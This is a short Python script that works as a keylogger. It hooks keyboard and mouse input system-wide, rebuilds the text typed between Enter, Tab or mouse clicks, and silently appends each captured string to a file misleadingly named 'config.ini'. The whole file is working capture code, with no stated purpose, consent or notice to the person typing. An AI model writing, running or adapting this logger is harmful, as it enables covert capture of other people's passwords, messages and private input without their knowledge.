import keyboard
import mouse
import time
import re

path = "config.ini"

mouse_clicked = None

ignore = (
    "caps lock",
    "shift",
    "ctrl",
    "alt",
    "alt gr",
    "tab",
    "enter",
    "delete",
    "insert",
    "home",
    "end",
    "page up",
    "page down",
    "esc",
    "windows",
    "menu",
    "print screen",
    "scroll lock",
    "pause",
    "arrow up",
    "up",
    "arrow down",
    "down",
    "arrow left",
    "left",
    "arrow right",
    "right",
    "f1",
    "f2",
    "f3",
    "f4",
    "f5",
    "f6",
    "f7",
    "f8",
    "f9",
    "f10",
    "f11",
    "f12",
    "num lock"
)

ignore_pattern = re.compile(r'^(?:[a-zA-Z ]+\+)[\w!@#$%^&*()_+\-=\[\]{};\'":,.<>/?\\|`~]+$')


def on_mouse(event):
    global mouse_clicked
    if hasattr(event, "button") and event.event_type == "down":
        if event.button == mouse.LEFT:
            mouse_clicked = "left mouse"
        elif event.button == mouse.RIGHT:
            mouse_clicked = "right mouse"


mouse.hook(on_mouse)

while True:
    typed = []
    mouse_clicked = None

    while True:
        # --- STOP CONDITIONS ---
        if mouse_clicked:
            stop_key = mouse_clicked
            break

        if keyboard.is_pressed("enter"):
            stop_key = "enter"
            break

        if keyboard.is_pressed("tab"):
            stop_key = "tab"
            break

        keys = keyboard.get_hotkey_name()

        if keys:
            if keys == "space":
                typed.append(" ")
            elif keys == "backspace":
                if typed:
                    typed.pop()
            elif keys in ignore:
                continue
            elif ignore_pattern.match(keys):
                last_part = keys.split("+")[-1]
                if last_part not in ignore:
                    typed.append(last_part)
            else:
                typed.append(keys)

            keyboard._pressed_events.clear()

        # tiny sleep - prevents CPU overload
        time.sleep(0.005)

    keyboard._pressed_events.clear()

    if typed:
        text = "".join(typed)
        with open(path, "a") as f:
            f.write("\n" + text)
            # Debug
            print(f"RECORDED: {text} (stopped on {stop_key})")
